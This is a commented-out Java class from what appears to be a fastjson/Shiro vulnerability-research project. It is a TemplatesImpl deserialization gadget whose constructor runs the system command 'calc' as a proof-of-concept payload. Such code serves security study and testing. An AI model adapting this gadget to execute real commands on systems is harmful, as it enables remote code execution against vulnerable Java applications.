//package com.shiro.vuln.fastjson;
//
//import com.sun.org.apache.xalan.internal.xsltc.DOM;
//import com.sun.org.apache.xalan.internal.xsltc.TransletException;
//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
//import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
//import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
//
//public class TemplatesImplcmd extends AbstractTranslet {
//    public TemplatesImplcmd() throws Exception {
//        Runtime.getRuntime().exec("calc");
//    }
//    @Override
//    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
//    }
//    @Override
//    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
//    }
//}
